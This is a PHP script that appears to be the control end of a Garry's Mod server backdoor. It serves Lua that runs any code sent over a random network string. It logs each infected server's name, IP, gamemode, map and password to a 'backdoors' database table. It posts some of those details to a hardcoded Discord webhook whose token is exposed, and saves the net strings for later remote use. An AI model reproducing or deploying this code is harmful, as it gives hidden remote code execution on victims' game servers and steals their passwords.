<?php

require_once($_SERVER['DOCUMENT_ROOT']."/project/api/core/config.php");

// request date
$date = date("y:m:d h:i:sa");

// game/server info
$server = $_POST['server'];
$serverip = $_POST['serverip'];
$gamemode = $_POST['gamemode'];
$password = $_POST['password'];
$token = $_GET['token'];
$map = $_POST['map'];

// if the servers password is null make it null
if(empty($password)) { $password = "NULL"; }
$net = $Secure::Randomize(); // this generates a random string then we use that as the net because gamer!!!
$lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";

// if you noitced that the server request is gone then yk
// in the .htaccess requests outside gmod or forbidden
echo $lua; // echo the backdoor script
if($token) {
    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => $token]);
    
    // if the servers not found then create the log else if the servers found then update the log
    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "token" => $token, "date" => $date]); }
    else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
}
else {
    $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => 'NONE']);
    
    // if the servers not found then create the log else if the servers found then update the log
    if($response == 0) { $GLOBALS['database']->Insert('backdoors', ["server" => $server, "ip" => $serverip, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
    else { $GLOBALS['database']->Update('backdoors', ["ip" => $serverip], ["server" => $server, "password" => $password, "gamemode" => $gamemode, "map" => $map, "net" => $net, "date" => $date]); }
    
    $json_data = json_encode([
        "embeds" => [
            [
                "title" => "",
                "color" => hexdec("#86ffba"),
                "timestamp" => date("c", strtotime("now")),
                "description" => "```Server: $server\nServer IP: $serverip\nMap: $map\nPassword: $password\nGamemode: $gamemode\n```",
                "footer" => [
                    "text" => "Worst-Logging",
                ]
            ]
        ]
    ]);
    // send the public info to our discord through a embed using the json data defined above
    $curl=curl_init("https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
    curl_exec($curl);
    // finnally save the netstring so users can use later
    file_put_contents($_SERVER['DOCUMENT_ROOT']."/project/bin/nets", "$net ", FILE_APPEND | LOCK_EX); 
}
?>

?>